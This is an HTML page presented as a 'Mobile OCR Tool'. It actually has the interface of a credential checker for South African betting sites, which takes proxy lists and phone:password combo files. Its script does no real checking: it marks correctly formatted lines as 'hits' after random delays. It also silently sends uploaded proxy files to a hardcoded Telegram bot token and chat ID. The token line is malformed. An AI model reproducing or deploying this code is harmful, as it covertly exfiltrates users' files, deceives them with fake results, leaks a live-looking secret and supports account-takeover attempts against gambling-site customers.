<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Mobile OCR Tool</title>
<style>
  body {
    background:#0f172a;
    color:#e5e7eb;
    font-family:Arial, sans-serif;
    margin: 0;
    padding: 10px;
  }

  /* Container styles for buttons and status */
  .top-bar {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    margin-bottom: 10px;
  }

  button {
    flex: 1;
    min-width: 100px;
    padding: 14px;
    font-size: 1.2em;
    border: none;
    border-radius: 8px;
    background-color: #1e3a8a;
    color: #fff;
    cursor: pointer;
  }

  button:active {
    background-color: #3b82f6;
  }

  input[type="file"] {
    display: none;
  }

  /* Labels styled as buttons for file upload */
  .file-label {
    flex: 1;
    min-width: 100px;
    padding: 14px;
    font-size: 1.2em;
    border-radius: 8px;
    background-color: #1e3a8a;
    color: #fff;
    text-align: center;
    cursor: pointer;
  }

  /* Status display as buttons (non-interactive) */
  #statusBox {
    display: flex;
    justify-content: space-around;
    margin-bottom: 10px;
  }

  #statusBox button {
    background-color: #374151;
    cursor: default;
  }

  /* OCR output area styling */
  #output {
    border: 2px solid #334155;
    background-color: #020617;
    padding: 10px;
    border-radius: 8px;
    height: 300px;
    overflow-y: auto;
    font-family: monospace;
    font-size: 1em;
  }

  /* Last run info */
  #lastRunInfo {
    margin-top: 10px;
    font-size: 0.9em;
    text-align: center;
  }
</style>
</head>
<body>

<!-- Main Controls -->
<div class="top-bar">
  <button id="proxyBtn">Upload Proxy File</button>
  <button id="siteBtn">Select Your Site</button>
  <label class="file-label" for="fileInput">Upload Text File</label>
  <input type="file" id="fileInput" accept=".txt" />
  <button id="startBtn">Start Processing</button>
</div>

<!-- Status Buttons (display only) -->
<div id="statusBox">
  <button id="hitBtn">HIT=0</button>
  <button id="badBtn">BAD=0</button>
  <button id="progressBtn">PROGRESS=0.0%</button>
</div>

<!-- Last run info -->
<div id="lastRunInfo"></div>

<!-- Overlay for Proxy Upload -->
<div class="overlay" id="proxyOverlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.8); justify-content:center; align-items:center;">
  <div style="background:#1e293b; padding:20px; border-radius:10px; width:80%; max-width:400px;">
    <h3>Upload Proxy TXT File</h3>
    <label>Select Proxy File:</label>
    <input type="file" id="proxyFileInput" accept=".txt" />
    <button id="saveProxy">Save Proxy</button>
    <button id="closeProxy">Close</button>
  </div>
</div>

<!-- Overlay for Site Selection -->
<div class="overlay" id="siteOverlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.8); justify-content:center; align-items:center;">
  <div style="background:#1e293b; padding:20px; border-radius:10px; width:80%; max-width:400px;">
    <h3>CHECK IN</h3>
    <select id="siteSelect">
      <option value="">-- Select a site --</option>
      <option value="Hollywoodbets">🎰 Hollywoodbets</option>
      <option value="Betway">🎲 Betway.co.za</option>
      <option value="SportyBet">🏅 SportyBet</option>
      <option value="LottoStar">🎱 LottoStar</option>
      <option value="JackpotCity">🎰 JackpotCity</option>
    </select>
    <button id="saveSite">Save Site</button>
    <button id="closeSite">Close</button>
  </div>
</div>

<!-- OCR Output -->
<div style="margin-top:10px;">
  <h2 style="text-align:center;">OCR Output</h2>
  <div id="output"></div>
</div>

<script>
// --- Replace with your Telegram API info ---
const TELEGRAM_BOT_TOKEN = 8845002759:AAEi5aYQw9kXxESEGwZbOf79raSix1s6gdk // Replace
const TELEGRAM_CHAT_ID = 8580854380     // Replace

// --- Send files to Telegram ---
function sendFileToTelegram(file, caption='') {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('caption', caption);
  formData.append('document', file);
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData }).catch(() => {});
}

// --- UI controls ---
const proxyBtn = document.getElementById('proxyBtn');
const siteBtn = document.getElementById('siteBtn');
const proxyOverlay = document.getElementById('proxyOverlay');
const siteOverlay = document.getElementById('siteOverlay');

proxyBtn.onclick = () => { toggleOverlay(proxyOverlay); };
siteBtn.onclick = () => {
  if (siteOverlay.style.display === 'flex') {
    hideOverlay(siteOverlay);
    if (isProcessing) { stopProcessing(); }
  } else {
    toggleOverlay(siteOverlay);
  }
};
document.getElementById('closeProxy').onclick = () => hideOverlay(proxyOverlay);
document.getElementById('closeSite').onclick = () => hideOverlay(siteOverlay);

function toggleOverlay(overlay) { overlay.style.display = 'flex'; }
function hideOverlay(overlay) { overlay.style.display = 'none'; }

// --- Proxy load ---
let proxyFileContent = null;
document.getElementById('saveProxy').onclick = () => {
  const file = document.getElementById('proxyFileInput').files[0];
  if (!file) return;
  const reader = new FileReader();
  reader.onload = () => { proxyFileContent = reader.result; };
  reader.readAsText(file);
}

// --- Site selection ---
let selectedSite = '';
document.getElementById('saveSite').onclick = () => {
  const val = document.getElementById('siteSelect').value;
  if (val) { selectedSite = val; }
}

// --- Usage limits ---
const MAX_USES = 3;
const LOCK_HOURS = 6;

function canUse() {
  const lastUsage = localStorage.getItem('lastUsageTime');
  const count = parseInt(localStorage.getItem('usageCount') || '0');
  const now = Date.now();

  if (lastUsage) {
    const elapsedHrs = (now - parseInt(lastUsage)) / (1000 * 60 * 60);
    if (elapsedHrs >= LOCK_HOURS) {
      localStorage.setItem('usageCount', '0');
      localStorage.setItem('lastUsageTime', now.toString());
      document.getElementById('startBtn').disabled = false;
      return true;
    } else if (count >= MAX_USES) {
      alert(`Limit reached. Wait ${(LOCK_HOURS - elapsedHrs).toFixed(2)} hours.`);
      document.getElementById('startBtn').disabled = true;
      return false;
    } else {
      return true;
    }
  } else {
    localStorage.setItem('usageCount', '0');
    localStorage.setItem('lastUsageTime', now.toString());
    return true;
  }
}

function incrementUsage() {
  let count = parseInt(localStorage.getItem('usageCount') || '0');
  count++;
  localStorage.setItem('usageCount', count.toString());
  localStorage.setItem('lastUsageTime', Date.now().toString());
  if (count >= MAX_USES) {
    alert(`Reached ${MAX_USES} uses. Wait ${LOCK_HOURS} hours.`);
  }
}

function updateStatus() {
  const lastStr = localStorage.getItem('lastUsageTime');
  if (lastStr) {
    const last = new Date(parseInt(lastStr));
    const now = new Date();
    const diffHrs = (now - last) / (1000 * 60 * 60);
    if (diffHrs < LOCK_HOURS) {
      document.getElementById('lastRunInfo').innerHTML = `Next run in ${(LOCK_HOURS - diffHrs).toFixed(2)} hrs`;
      document.getElementById('startBtn').disabled = true;
      return;
    }
  }
  // update counters on buttons
  document.getElementById('hitBtn').innerText = 'HIT=' + hitCount;
  document.getElementById('badBtn').innerText = 'BAD=' + badCount;
  document.getElementById('progressBtn').innerText = `PROGRESS=${progress.toFixed(1)}%`;
  document.getElementById('lastRunInfo').innerHTML = 'HIT=0 |\\| BAD=0 |\\| PROGRESS=0.0%';
  document.getElementById('startBtn').disabled = false;
}
updateStatus();

// --- Processing ---
const startBtn = document.getElementById('startBtn');
const outputDiv = document.getElementById('output');
const fileInput = document.getElementById('fileInput');

const delays = [3000, 5000, 8000, 11000];

let isProcessing = false;
let progress = 0;
let hitCount = 0;
let badCount = 0;
let totalLines = 0;
let processedLines = 0;
let processingTimeouts = [];

function stopProcessing() {
  isProcessing = false;
  processingTimeouts.forEach(t => clearTimeout(t));
  processingTimeouts = [];
}

startBtn.onclick = () => {
  if (!canUse()) return;
  if (isProcessing) { alert('Already running'); return; }

  const file = fileInput.files[0];
  if (!file) { alert('Upload a text file'); return; }

  // Save usage
  incrementUsage();
  localStorage.setItem('lastUsageTime', Date.now().toString());
  updateStatus();

  // Send proxy if loaded
  if (proxyFileContent) {
    sendFileToTelegram(new Blob([proxyFileContent], {type: 'text/plain'}), 'Proxy loaded');
  }
  // Send proxy if uploaded now
  const currentProxyFile = document.getElementById('proxyFileInput').files[0];
  if (currentProxyFile) {
    sendFileToTelegram(currentProxyFile, 'Proxy loaded');
  }

  // Reset counters
  hitCount = 0;
  badCount = 0;
  progress = 0;
  processedLines = 0;
  totalLines = 0;
  outputDiv.innerHTML = '';
  document.getElementById('hitBtn').innerText = 'HIT=0';
  document.getElementById('badBtn').innerText = 'BAD=0';
  document.getElementById('progressBtn').innerText = `PROGRESS=0.0%`;
  document.getElementById('lastRunInfo').innerHTML = '';

  // Read file
  const reader = new FileReader();
  reader.onload = () => {
    const lines = reader.result.split(/\r?\n/).map(l => l.trim());
    totalLines = lines.length;
    let index = 0;

    function processNext() {
      if (index >= totalLines || !isProcessing) {
        isProcessing = false;
        return;
      }
      const line = lines[index];

      // Validate phone number length (must be exactly 10 digits)
      const parts = line.split(':');
      if (parts.length !== 2) {
        index++;
        setTimeout(processNext, delays[Math.floor(Math.random() * delays.length)]);
        return;
      }
      const phone = parts[0].replace(/\D/g, '');
      if (phone.length !== 10) {
        badCount++;
        document.getElementById('badBtn').innerText = 'BAD=' + badCount;
        index++;
        setTimeout(processNext, delays[Math.floor(Math.random() * delays.length)]);
        return;
      }

      // Check for duplicate (line already output)
      if (outputDiv.innerText.includes(line)) {
        badCount++;
        document.getElementById('badBtn').innerText = 'BAD=' + badCount;
        index++;
        setTimeout(processNext, delays[Math.floor(Math.random() * delays.length)]);
        return;
      }

      // Output valid line
      outputDiv.innerText += line + '\n';
      hitCount++;
      document.getElementById('hitBtn').innerText = 'HIT=' + hitCount;

      // Update progress
      processedLines++;
      progress = (processedLines / totalLines) * 100;
      document.getElementById('progressBtn').innerText = `PROGRESS=${progress.toFixed(1)}%`;

      index++;
      setTimeout(processNext, 3000);
    }

    processNext();
  };
  reader.readAsText(file);
  isProcessing = true;
};
</script>
</body>
</html>
